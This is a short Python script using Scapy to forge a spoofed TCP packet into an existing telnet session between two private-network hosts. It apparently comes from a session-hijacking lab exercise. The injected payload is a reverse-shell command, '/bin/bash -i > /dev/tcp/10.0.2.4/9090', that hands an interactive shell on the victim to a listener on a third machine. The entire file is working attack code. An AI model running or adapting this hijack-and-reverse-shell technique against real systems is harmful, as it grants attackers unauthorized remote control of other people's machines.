#!/usr/bin/python3
import sys
from scapy.all import *
IPLayer = IP(src="10.0.2.7", dst="10.0.2.5")
TCPLayer = TCP(sport=55474, dport=23, flags="A",
seq=1493694188, ack=3709004915)
Data = "\r /bin/bash -i > /dev/tcp/10.0.2.4/9090 2>&1 0<&1 \r"
pkt = IPLayer/TCPLayer/Data
ls(pkt)
send(pkt,verbose=0)
